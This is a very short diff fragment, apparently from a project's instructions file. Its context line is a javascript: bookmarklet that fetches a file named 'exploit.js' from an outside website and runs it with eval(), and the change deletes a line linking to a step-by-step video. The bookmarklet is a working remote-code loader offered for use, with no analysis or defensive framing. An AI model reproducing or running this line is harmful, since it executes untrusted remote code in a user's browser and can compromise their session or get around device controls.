@@ -1,3 +1,2 @@
 javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
 
-Step by step video https://drive.google.com/file/d/1XISQkXOD18cBz0zZD7drY41HrYw6Lu3J/view
